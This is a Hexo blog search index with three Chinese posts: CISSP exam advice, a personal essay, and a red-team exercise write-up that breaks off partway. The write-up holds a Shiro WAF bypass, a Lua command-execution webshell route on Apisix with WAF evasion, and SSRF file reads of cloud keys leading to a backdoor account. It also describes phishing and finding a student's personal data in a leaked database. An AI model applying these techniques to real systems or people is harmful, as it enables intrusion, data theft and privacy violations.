<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>60天通关CISSP考试 经验分享</title>
      <link href="/2024/12/27/60%E5%A4%A9%E9%80%9A%E5%85%B3CISSP%E8%80%83%E8%AF%95-%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2024/12/27/60%E5%A4%A9%E9%80%9A%E5%85%B3CISSP%E8%80%83%E8%AF%95-%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前几月，我顺利通过了CISSP考试，结束了长达两个月的折磨</p><p>分享一下我通过CISSP的经验</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201323390.png" alt="image-20240920132328351" style="zoom: 25%;" /><h2 id="一、报考相关-劝退指南"><a href="#一、报考相关-劝退指南" class="headerlink" title="一、报考相关(劝退指南):"></a>一、报考相关(劝退指南):</h2><p>先讲一下我自己的情况，学习安全方面东西有九年了，现在在互联网厂做应用安全，sdlc方向。</p><p>我的建议是:<strong>有安全方面从业经验，且英语不太差的人报考</strong></p><p><strong>如果完全没有从业经验，是真的不建议报考，很有可能变成花钱买罪受!</strong></p><h4 id="一、为什么建议有经验的人报考呢❓"><a href="#一、为什么建议有经验的人报考呢❓" class="headerlink" title="一、为什么建议有经验的人报考呢❓"></a>一、为什么建议有经验的人报考呢❓</h4><p>针对这个考试，以往线性考试的情况下，大家做的题基本上都差不多，所以可以依靠某些投机取巧的方式过关；</p><p>但是在2023年，官方认识到了这个问题，<strong>并且抽了大量人重考</strong>，随后考试模式也变更了CAT模式(可以理解为计算机自适应抽题，哪个知识点答的差，就拷打你哪个知识点)，<strong>所以这种情况下大家做的题基本上都不一样</strong>，基本不可能再依靠”投机取巧”过关。</p><p><strong>在考试题中，大部分题目都不是书上学过的知识</strong>，需要有比较丰富的实践经验，和对安全管理的认知才能完成作答</p><p>考试并不是学明白书上的东西就万事大吉的，到考试的时候大家看到题都会感觉懵逼，因为学的和考的关系不大</p><h4 id="二、为什么建议英语不要太差"><a href="#二、为什么建议英语不要太差" class="headerlink" title="二、为什么建议英语不要太差"></a>二、为什么建议英语不要太差</h4><p>CISSP考试的时候很多翻译都是一坨💩，翻译的根本不通顺，也不符合常规的技术表述，这就需要我们拥有阅读英语原题的能力。</p><p>对于英语基础不太好的兄弟来说，这是一个难事</p><h2 id="二、基础知识学习"><a href="#二、基础知识学习" class="headerlink" title="二、基础知识学习"></a>二、基础知识学习</h2><p>cissp的内容分为8大Domain，基本上从技术到管理无所不包。但是属于一公里宽，一英尺深，内容深度都不算很深，但是很综合，主要培养安全管理思维。</p><p>基础知识，目前官方的教材是<strong>OSG(CISSP Official Study Guide)</strong></p><p>民间教材有AIO(CISSP ALL IN ONE.) 两者选一者看即可</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201324952.png" alt="image-20240920132459922" style="zoom: 25%;" /><p><strong>本人建议以OSG为主，因为OSG算是官方考纲</strong>。目前OSG推出了10th第十版，但是中文版本市面上只有第九版，考试已经涵盖了第十版的内容，我建议英语比较好的兄弟们直接看第十版，某宝可以买到第九版。</p><p><strong>PS：顺便吐槽一句，中文版的OSG有多处翻译错误和表述问题，大家学习的时候需要把一些关键名词的英语记好</strong></p><p>​<strong>比如rogue Tower，中文版的OSG翻译成“流氓塔”，给我看懵逼了好久…后来我反应过来是tmd伪基站🤡</strong></p><p><strong>针对OSG，我的建议是通读(精读)最少一遍</strong>，除非你有及其丰富的大企业安全管理经验</p><p>很多人说不用看书啥的，我认为是不科学的，书中知识点可能比较零散，但是会对我们的结构化思考能力有所裨益。</p><h2 id="三、刷题"><a href="#三、刷题" class="headerlink" title="三、刷题"></a>三、刷题</h2><p>❗<strong>核心原则 : 要多刷题，千万不要背题，不要试图拿着国内认证考试的逻辑报考CISSP</strong></p><p>刷题建议使用<strong>CISSP Official Practice&#x2F;exam</strong>，书是英文的，网上可以找到，但是也有民间翻译好的(但很多翻译不准)。</p><p>我刷完了Official Practice所有题目，<strong>包括八个知识域和四个综合练习，并掌握了题中每个选项涉及的知识。</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201321410.png" alt="image-20240920132123364" style="zoom:25%;" /><p>八个知识域的题目，随机抽取作答，<strong>正确率在考试前可以到90%以上</strong></p><p>四个综合练习当模拟题做，**正确率在75%-85%**，大家可以参考一下</p><p>❗<strong>另外：强烈建议整理错题本，时不时翻看，要弄懂知识，而不是记下来选项</strong></p><h2 id="四、考试缴费与预约"><a href="#四、考试缴费与预约" class="headerlink" title="四、考试缴费与预约"></a>四、考试缴费与预约</h2><p>CISSP考试可以在isc2官网提前预约，<strong>并且在每个季度最后一个月进行考试</strong>，考试托管给了<strong>PearsonVue机构(中文名叫培生)</strong></p><p>考试费用目前是750刀一次，<strong>挂了的话钱打水漂</strong>，只能重来一次(<strong>所以建议准备好再去考，不然真的是送钱，750刀对我来说是一个月饭钱</strong>)</p><p>有的时候官方会推出”安心考”服务，950刀即可享受一次考试+如果考挂了在下个季度重来一次</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201331374.png" alt="image-20240920133158343" style="zoom: 50%;" /><p><strong>大家如果对自己不是很有信心的话，我感觉上个保险还是有必要的，心里有个底(虽然我上了保险，也没用得上，一次通过了)</strong></p><h2 id="五、考前准备"><a href="#五、考前准备" class="headerlink" title="五、考前准备"></a>五、考前准备</h2><p>考前准备好**身份证+一张个人签名的信用卡(官方要求必须是信用卡)**，进考场前要用</p><p><strong>针对知识方面一定要建立自己的错题本，把错了的每个知识点对着OSG或者GPT弄懂</strong>，<strong>考试指不定就考到了。</strong></p><p>手写笔记这块看个人习惯，我的话喜欢把东西写下来，然后时不时review，下图这种篇幅的笔记，在考前我写了大几十页(忽略我不好看的字)</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201333596.png" alt="image-20240920133310554" style="zoom:25%;" /><h2 id="六、考试开始前"><a href="#六、考试开始前" class="headerlink" title="六、考试开始前"></a>六、考试开始前</h2><p>到考试当天，我们需要前往官方指定的PearsonVue考场，一般在一线城市(北上深，成都，西安等等)都有考点</p><p>如果所在城市没有考点的同学，需要提前订好酒店去一线城市考试，还是比较辛苦的</p><p>考试大部分会在上午开始，考试基本上都能准时进行，<strong>进入考场范围后不能复习任何资料，手机关机。</strong></p><p><strong>随后工作人员会进行人证查验，拍照，在正式进入考场前，要录入掌纹(是的你没看错，不是指纹)</strong></p><p>北京PearsonVue考场外面大概是这个样子</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201336084.png" alt="image-20240920133639043" style="zoom:25%;" /><h2 id="七、考试进行时"><a href="#七、考试进行时" class="headerlink" title="七、考试进行时"></a>七、考试进行时</h2><p>进入考场后，一般十几个人在一个考场，<strong>全程头顶摄像头录音录像，每个人之间有很高的隔板</strong></p><p>而且别人考的大概率也不是CISSP，因为PearsonVue承接多家考试</p><p><strong>所以不要有任何歪心思，考场比高考还严。</strong></p><p>目前CAT模式的考试是”自适应”的，三个小时时间，<strong>题目都是单选，作答100-150道题都有可能</strong>，计算机会自动计算你的答题准确率和通过率，<strong>当你作答第100道题后，如果计算机认为你已经可以通过考试，那么你的考试会直接结束(当然也不排除，机器认为你这次考试挂定了</strong></p><p>笔者是作答到120道题考试结束的，平均一分钟一道题。</p><p><strong>所以大家要稳住心态，无论作答到多少道题，冷静思考，调动经验和所学才是最重要的。</strong></p><p>至于大家最关心的考试题目难度，我只能说：**比较难(在我自认为我的安全经验超过了绝大多数人的情况下)**。</p><p><strong>考试中的题目只有25%左右是能用所学知识直接秒杀的，其余都得根据题干描述择优选择，这很让人纠结</strong></p><p>考试结束后，我整个人脑子都是一种发麻的感觉</p><h2 id="八、考试结束"><a href="#八、考试结束" class="headerlink" title="八、考试结束"></a>八、考试结束</h2><p>在100-150题这个区间内，机器会根据数学计算，判定你是否通过，<strong>你永远也不知道点下一题的时候，界面是不是”考试结束”四个大字</strong></p><p>在结束后，需要重新录入掌纹，比对身份信息；</p><p><strong>接下来考场的老师会把你的成绩单背面朝上递给你(据说是为了防止一块考的朋友如果看到没过，比较尴尬.. 😅)</strong></p><p>拿到成绩单，如果上面的内容，和本文第一张图一致，那么恭喜你，你顺利通过了CISSP考试！🎉</p><p>如果成绩单上列出了你存在不足的知识domain，那么很遗憾，意味着考试还需再战</p><h2 id="九、背书与证书维持"><a href="#九、背书与证书维持" class="headerlink" title="九、背书与证书维持"></a>九、背书与证书维持</h2><p>在考试通过后，isc2会向你的邮箱发送邮件，收到邮件后就可以准备背书工作啦。</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202409201346107.png" alt="image-20240920134621063" style="zoom:50%;" /><p><strong>背书成为“member”要求有五年的工作经验，可以选择背书人背书，也可以选择官方审查资料背书</strong></p><p><strong>一般选背书人的多一些，某宝也有这种服务，本科如果是IT相关专业，可以减少一年经验要求。</strong></p><p><strong>背书成为”associate”，准会员，不需要满足工作经验，每年要交50美金，维持准会员身份，满足工作经验后提交材料可以转正。</strong></p><p>在大概6-8个周背书审核通过后，会发邮件告知大家，在缴纳会费(每年135刀)后，会取得CISSP证书</p><p>纸质版证书后续会寄到ISC2的中国办公室，然后办公室会联系大家确认详细地址。</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202410251050468.png" alt="image-20241025105055428" style="zoom:50%;" /><p><strong>证书就是长这样啦~</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202410251050554.png" alt="image-20241025105013489" style="zoom: 25%;" /><p>拿到CISSP证书后，<strong>我们需要交年费（135刀），并且赚取CPE(学分)来维持证书（3年120 CPE）</strong></p><p><strong>这个在收到证书时都会提供相关资料</strong></p><h2 id="十、最后"><a href="#十、最后" class="headerlink" title="十、最后"></a>十、最后</h2><p><strong>对于CISSP这一认证，想必大家都看重它不一般的含金量，所以选择和我一样花钱找罪受</strong></p><p><strong>最后祝大家考的全会也许不太现实，但可以衷心祝愿大家在CISSP考试中蒙的全对</strong>😛</p><h2 id="Contact-To-Me"><a href="#Contact-To-Me" class="headerlink" title="Contact To Me"></a>Contact To Me</h2><p><strong>如有大家关于CISSP报考，学习相关问题，欢迎联系我的微信：J0o1ey997</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202410251055931.png" alt="image-20241025105533878" style="zoom: 50%;" />]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鲜花与烧鸡</title>
      <link href="/2024/02/18/%E9%B2%9C%E8%8A%B1%E4%B8%8E%E7%83%A7%E9%B8%A1/"/>
      <url>/2024/02/18/%E9%B2%9C%E8%8A%B1%E4%B8%8E%E7%83%A7%E9%B8%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>未选择的路（有删减） </p><p>黄色的树林里分出两条路</p><p>可惜我不能同时去涉足</p><p>我在那路口久久伫立 </p><p>我向着一条路极目望去 </p><p>直到它消失在丛林深处。 </p><p>但我却选了另外一条路 </p><p>它荒草萋萋，十分幽寂 显得更诱人，更美丽； </p><p>虽然在这条小路上，很少留下旅人的足迹 </p><p>一片树林里分出两条路—— </p><p>而我选择了人迹更少的一条</p><p>从此决定了我一生的道路。</p><p>未选择的路（有删减）— 弗罗斯特</p></blockquote><p>很久没写杂文了，公众号长期未更新，索性我就当作自留地。</p><p>今天是龙年开工的第一个工作日，没回公司上班，请假继续呆在老家，在北京呆了大半年，深感身心俱疲，选择给自己一点精神放空的时间。</p><p>前两天过情人节，我妈妈和我闲聊，聊起来多年以前的经历。</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202405112146003" alt="图片" style="zoom:50%;" /><hr><p>二十多年前的情人节，那时候我妈妈和我差不多大，步入工作岗位不久，上班时，我妈妈和年轻的女同事聊起来情人节礼物，聊起来是否有人来送花。这时旁边的一个刚结婚不久的大哥站了起来说:<strong>送啥花呀，不如搞个烧鸡啃啃。</strong>这句话可谓是一石激起千层浪千层浪，我妈和身边的女同事当时打着圆场，后面却议论纷纷，吐槽着烧鸡怎能和鲜花相提并论，毫无节日的浪漫与情怀可言，可谓是有被<strong>“下头”</strong>到。</p><hr><p>后来我妈妈和这个世界大多数女人一样：结婚生子，在城市中谋生存，经营着并不宽裕的日子。人到中年，许多理想被现实风干，今日再想起往日的“鲜花”与烧鸡，我妈妈笑着说：<strong>如果你爸真送我一束花，我感觉完全没必要，真的不如搞个烧鸡啃啃。</strong></p><p>这一句话对我触动很深，思索很久，所谓的鲜花与烧鸡的选择，是情人节礼物的选择，又何尝不是人生的选择呢？</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202405112146009" alt="图片" style="zoom:33%;" /><hr><p>动笔写这篇文章时，许多青涩岁月的回忆突然涌上心头。笔者在青春期时，最开始的梦想是当摇滚乐队的主唱或者电吉他手，那时喜欢摇滚乐那种永不妥协的精神，喜欢那种自由自我，高唱我歌的洒脱，当这个梦想和父母交流时，毫无疑问被一言否定，父母希望我能继续子承父业，入职券商去做金融证券。</p><p>摇滚梦虽然被否定，但随着时间的流逝，我找到了第二个兴趣点，便是现在从事的网络安全，虽然那时候课业压力重，父母极力反对，但是并不妨碍我比过往更加坚定，所以有幸一步步走到现在，真正把爱好做成了职业。</p><hr><p>一路走来，我恍然感觉人生确实像一首动人的歌，不同的音符串联起独特的旋律，而难得的是在这乐章中找到了自己的位置。如今的我或许没能完成自己的音乐梦，但是也算在自己热爱的领域生根发芽。</p><p><strong>尽管如今我的鲜花与烧鸡似乎已然浑然一体，这让我有时身心俱疲，有时迷茫，但能用热爱书写着生命的旋律已然是极为有幸。那段被否定的梦想，成为我成长的一部分，教导我在一路上更加坚韧。</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202405112146386" alt="图片" style="zoom:50%;" /><hr><p>回到母亲那句“真的不如搞个烧鸡啃啃”，我思考着人生中的选择。有时候，我们被太多的期待和目光束缚，忘记了心中的明月。是鲜花还是烧鸡，是天马行空还是按图索骥，我们很清楚每个选择都决定着生命的乐章，但是却很少有人勇敢地选择自己内心的路。</p><p>在北京居住的半年多时间里，在发动机的喧嚣中，我明白了生活的不易，但也学会了用心去品味生活的点滴。<strong>或许物欲横流的社会中，我们无法一直保持初心，但可以在岁月的沉淀中，找到那份让心灵微笑的平静，找到那份让自己能够真正快乐的事业。</strong></p><p>如今夜深人静，我很想端起吉他，弹一首许巍的《执着》，但是时过境迁，好久不摸吉他，现在连最基本的几个和弦都记不太住了。端起电脑，或许，在这片文字的世界里，我能够找到更多的共鸣和勇气，继续前行。生活，就是一曲旋律，我们需要用心去感受，用力去演奏。</p><hr><p><strong>我的友人，在生活前，无论你选择了鲜花还是烧鸡，无论在追逐明月还是六便士，请不要忘记能让你发自内心微笑的理想。</strong></p><p><strong>都要执着。</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202405112146382" alt="图片"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某头部直辖市攻防演练纪实-如何不用0day打下n个点</title>
      <link href="/2023/12/01/%E6%9F%90%E5%A4%B4%E9%83%A8%E7%9B%B4%E8%BE%96%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%BA%AA%E5%AE%9E-%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A80day%E6%89%93%E4%B8%8Bn%E4%B8%AA%E7%82%B9/"/>
      <url>/2023/12/01/%E6%9F%90%E5%A4%B4%E9%83%A8%E7%9B%B4%E8%BE%96%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%BA%AA%E5%AE%9E-%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A80day%E6%89%93%E4%B8%8Bn%E4%B8%AA%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>几个月前打了一场某地的攻防演练，演练当时通知的很急促，没做什么准备直接小米加步枪上阵了…</p><p>在此过程中，很多个没用到0day的打点案例都很有意思，下面就简单分享一下</p><h2 id="案例一、某单位shiro绕WAF-利用shiro处理rememberMe字段值的feature"><a href="#案例一、某单位shiro绕WAF-利用shiro处理rememberMe字段值的feature" class="headerlink" title="案例一、某单位shiro绕WAF(利用shiro处理rememberMe字段值的feature)"></a>案例一、某单位shiro绕WAF(利用shiro处理rememberMe字段值的feature)</h2><p>信息搜集到某单位的CAS系统…当时开着Burpsuite插件，扫到了默认的shiro秘钥</p><p>当时开心坏了…但是有遥遥领先厂商的WAF在，如果直接上现成的工具会直接寄</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201458493.png" alt="image-20231120145846021" style="zoom:50%;" /><p>后面试了试网上公开的方法，直接把请求方式删掉，依然被拦，包直接被重置掉，无奈寻找新faeture</p><p>最终在Shiro的rememberMe字段值处理流程中，发现在Base64解码过程中有戏</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508131.png" alt="img"></p><p>如图，在shiro解码base64字符串的过程中，会调用discardNonBase64方法去除掉非Base64的字符</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508372.png" alt="img"></p><p>如图所示</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508487.png" alt="img"></p><p>那么思路就来了，只需往rememberMe字段的值中填充非Base64的字符即可绕过WAF(比如$符号)</p><pre><code>Base64包括小写字母a-z,大写字母A-Z,数字0-9,符号+和/组成的64个字符的字符集,另外包括填充字符=</code></pre><p>在本地进行测试，果然奏效</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508902.png" alt="img"></p><p>那么后面就很简单了，把现成的Shiro利用工具配置Burpsuite的代理，Match&amp;Replace替换部分字符串即可</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201511950.png" alt="image-20231120151135911"></p><p>最终也是成功拿下Shell，只可惜过了半小时就被应急了…</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201512617.png" alt="img"></p><h2 id="案例二、某互联网厂商-Apisix绕阿里WAF拿下28个Rce"><a href="#案例二、某互联网厂商-Apisix绕阿里WAF拿下28个Rce" class="headerlink" title="案例二、某互联网厂商 Apisix绕阿里WAF拿下28个Rce"></a>案例二、某互联网厂商 Apisix绕阿里WAF拿下28个Rce</h2><p>如图使用了apisix网关的WebServer在用户访问不存在的路由时，会抛出如下错误，这可以作为我们指纹识别的特征所在</p><pre><code>&#123;  &quot;error_msg&quot;: &quot;404 Route Not Found&quot;&#125;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201516744.png" alt="img"></p><p>针对Apisix节点的攻击方法，想要RCE的话，历史上主要有“默认X-API-Key”和“Dashboard未授权访问”两个洞可以用</p><p>过往挖某SRC的时候，就遇到过默认X-API-Key导致可直接创建执行lua代码的恶意路由的问题</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201519275.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201520158.png" alt="img"></p><p>恰巧这次攻防演练中，某目标子域的Apisix，正好就存在Dashboard的未授权访问</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201522994.png" alt="image-20231120152222856" style="zoom:50%;" /><p>直接去Github扒了一个脚本，发现能检测出漏洞，但是RCE利用不成功，把reponse打印出来后，果然…被阿里云的WAF给拦了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201523524.png" alt="img"></p><p>随后把创建恶意路由的请求包中，添加一个带有大量脏数据的Json键，发现阿里云不拦了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201525926.png" alt="image-20231120152555881"></p><p>用之前的Dashboard未授权访问漏洞查看路由，显示恶意路由确实是被写入了…但是直接访问恶意路由却依然提示404</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201528596.png" alt="image-20231120152857545"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201530171.png" alt="image-20231120153028126"></p><p>通过未授权访问漏洞，获取全量路由配置后，发现目标apisix应该是集群部署的…</p><pre><code>/apisix/admin/migrate/export</code></pre><p>每个路由需要有一个host键来确定该路由被添加到哪个子域</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221200399.png" alt="image-20231120153214811"></p><p>随后再次构造写入恶意路由的数据，把host键加上，发现可以成功写入了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201534485.png" alt="image-20231120153424427"></p><p>利用未授权接口读出全量路由config，并提取出host键，确定可写入恶意路由的子域范围</p><pre><code>import jsondef read_config():    with open(&quot;data.json&quot;, &#39;r&#39;) as json_file:        config = json.load(json_file)    return configdata = read_config()if &quot;Routes&quot; in data:    for route in data[&quot;Routes&quot;]:        if &quot;host&quot; in route:            host_value = route[&quot;host&quot;]            with open(&quot;data.txt&quot;, &quot;a&quot;) as file:                file.write(host_value + &quot;\n&quot;)                print(host_value)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221102603.png" alt="image-20231122110158076"></p><p>但是后面执行命令，有的时候会被阿里云给拦掉，于是构造lua脚本时把传参和命令输出做了倒转，防止被流量检测到</p><pre><code class="lua">local file=io.popen(string.reverse(ngx.req.get_headers()[&#39;Authenication&#39;]),&#39;r&#39;)local output=file:read(&#39;*all&#39;)file:close()ngx.say(string.reverse(output))</code></pre><p>由于该apisix集群部署管理了28个子域的服务，所以成功拿下28个子域Rce</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201535765.png" alt="img"></p><h2 id="案例三、某开发商Nacos未授权访问读取配置信息到精准钓鱼进入内网"><a href="#案例三、某开发商Nacos未授权访问读取配置信息到精准钓鱼进入内网" class="headerlink" title="案例三、某开发商Nacos未授权访问读取配置信息到精准钓鱼进入内网"></a>案例三、某开发商Nacos未授权访问读取配置信息到精准钓鱼进入内网</h2><p>利用nacos未授权访问，从CONFIG.INFO读取config信息</p><p>很幸运，其中包含公有云数据库凭据</p><pre><code>/nacos/v1/cs/ops/derby?sql=select+*+from+CONFIG_INFO+st</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539001.png" alt="img"></p><p>可惜试了一下都配了策略，没法外网直接连过去</p><p>但是…却发现了config信息中，出现了某系统的一个手机号</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539163.png" alt="img"></p><p>随后加上微信钓鱼，以系统升级为由，成功拿到权限</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539225.png" alt="img" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539618.png" alt="img" style="zoom:50%;" /><h2 id="案例四、某国企-从一个任意文件读取到SSO沦陷"><a href="#案例四、某国企-从一个任意文件读取到SSO沦陷" class="headerlink" title="案例四、某国企-从一个任意文件读取到SSO沦陷"></a>案例四、某国企-从一个任意文件读取到SSO沦陷</h2><p>某国企子域的资产，发现使用了kkfileview开源项目</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221111402.png" alt="image-20231122111118350"></p><p>翻了一下历史issue，存在全回显的ssrf，在目标上验证成功</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201541504.png" alt="img"></p><p>同时很幸运，这个点支持file:&#x2F;&#x2F;协议，随后通过file协议读取到网站配置文件，拿到了目标的AK,SK</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201550394.png" alt="image-20231120155009326"></p><p>使用阿里云的Cli创建后门账户，接管目标公有云</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201544358.png" alt="img"></p><p>同时在root目录，发现有诸多数据库文件</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201543028.png" alt="img" style="zoom:50%;" /><p>读出多个sql文件内容后，有些库中存放的员工密码是弱加密的</p><p>借此我们掌握了部分员工的姓名，工号，明文密码，部门</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201550915.png" alt="img"></p><p>随后使用IT部门职级比较高的人员的工号、密码，成功进入SSO系统，拥有管理权限</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201552458.png" alt="img" style="zoom:50%;" /><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201552642.png" alt="img"></p><p>后面就很简单了，创建一个账户，把所有产品和平台的权限点满…</p><p>然后，然后所有通过sso登录的系统都能访问到了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201554221.png" alt="image-20231120155412165"></p><h2 id="案例五、兵不血刃打穿某高校"><a href="#案例五、兵不血刃打穿某高校" class="headerlink" title="案例五、兵不血刃打穿某高校"></a>案例五、兵不血刃打穿某高校</h2><p>为什么说兵不血刃呢…因为目标高校外网暴露面很小，基本上攻防演练期间能关的都关了</p><p>但是目标高校正值开学季，开放了一个研究生学号的查询系统，可以使用研究生的身份证+姓名查询学号和初始密码</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201558675.png" alt="image-20231120155825627"></p><p>随后我开始漫长的百度之旅…最终定位到了一名在该校就读的研究生新生小姐姐</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201602766.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201602011.png" alt="img"></p><p>利用xx库的神秘力量，找到了小姐姐的信息</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311231022017.png" alt="image.png"></p><p>最终成功拿到小姐姐的学号和初始密码</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201603115.png" alt="img"></p><p>非常走运，小姐姐没有改密码，直接进入到ssl vpn系统中</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201604922.png" alt="image-20231120160448869"></p><p>在某个查看学生个人信息的系统重，队友的Burp被动扫描到了一个二级目录的swagger文档</p><p>而“添加学生信息查看角色”的接口，竟然是没有鉴权的</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201605015.png" alt="img"></p><p>随后利用接口，把当前用户添加查看学生信息的权限</p><p>如图，拿下全校十万学生的详细信息~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201606224.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201606864.png" alt="img"></p><h2 id="案例6、某单位Gitlab项目权限误配导致公有云接管"><a href="#案例6、某单位Gitlab项目权限误配导致公有云接管" class="headerlink" title="案例6、某单位Gitlab项目权限误配导致公有云接管"></a>案例6、某单位Gitlab项目权限误配导致公有云接管</h2><p>防守单位中某单位的Gitlab开放到了公网，但是爆破了一顿，并不存在弱口令</p><p>但是经过对Gitlab的测试，找到了Gitlab中仓库权限的配置问题</p><pre><code>/api/v4/projects</code></pre><p>获取到gitlab中部分仓库为public状态，非登录态可直接访问</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221405998.png" alt="image-20231122140539936"></p><p>如图，成功访问到某内部项目</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201611451.png" alt="image-20231120161131396"></p><p>最终在某项目中成功找到了可用的ak,sk，完成公有云接管</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201613046.png" alt="img"></p><h2 id="案例七、某单位系统从一个actuator-httptrace端点到千万量级敏感信息"><a href="#案例七、某单位系统从一个actuator-httptrace端点到千万量级敏感信息" class="headerlink" title="案例七、某单位系统从一个actuator httptrace端点到千万量级敏感信息"></a>案例七、某单位系统从一个actuator httptrace端点到千万量级敏感信息</h2><p>挂着Burp代理，被动扫描到了一个actuator接口，很幸运，开放了httptrace endpoint，借此我们可以获取到系统中的http请求日志</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221116337.png" alt="image-20231122111607300"></p><p>但是发现如图上方使用的鉴权header并不能直接进入到系统中</p><p>刚开始怀疑是鉴权信息的过期时间设置的比较短，写了个脚本监控带有x-access-token的新增请求</p><pre><code class="python">import requestsimport timemonitored_text = &quot;&quot;# URLurl = &quot;http://xxxxx.xxxxx.com/xxxxxx/actuator/httptrace/&quot;while True:    try:        response = requests.get(url)        page_text = response.text        new_content = page_text[len(monitored_text):]        # 检查新增的内容是否包含 &quot;x-access-token&quot; 字符串        if &quot;x-access-token&quot; in new_content:            current_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())            print(f&quot;新增的内容包含 &#39;x-access-token&#39; 于 &#123;current_time&#125;&quot;)        monitored_text = page_text        time.sleep(1)    except Exception as e:        print(f&quot;error Info: &#123;e&#125;&quot;)</code></pre><p>最终成功拿到了一个可用的token，发现是JWT形式的-_-||…</p><p>原来之前拿到的token是测试数据，难怪用不了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221126096.png" 